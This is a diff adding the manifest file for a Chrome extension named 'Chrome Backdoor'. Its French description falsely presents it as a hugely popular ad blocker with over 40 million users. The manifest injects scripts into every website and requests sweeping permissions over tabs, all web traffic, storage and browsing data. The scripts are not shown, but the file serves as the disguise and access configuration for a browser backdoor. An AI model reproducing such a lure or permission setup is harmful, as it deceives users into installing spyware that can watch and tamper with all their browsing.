@@ -1,0 +1,38 @@
+{
+    "name": "Chrome Backdoor (graniet)",
+    "description": "La plus populaire des extensions Chrome, avec plus de 40 millions d'utilisateurs ! \n Bloque la publicité sur le web.",
+    "version": "2.1",
+    "manifest_version": 2,
+    "icons": { 
+    "16": "img/2.png",
+    "32": "img/2.png",
+    "48": "img/2.png",
+    "128": "img/2.png"
+    },
+    "background":{
+      "scripts":[
+          "js/call.js",
+          "lib/jquery.min.js"
+      ]
+    },
+    "content_scripts": [
+        {
+            "matches": [
+                "<all_urls>"
+            ],
+            "js": [
+                "lib/jquery.min.js",
+                "js/check.js"
+            ]
+        }
+    ],
+  "permissions": [
+      "tabs",
+      "http://*/",
+      "https://*/",
+      "background",
+      "webRequest",
+      "storage",
+      "browsingData"
+  ]
+}
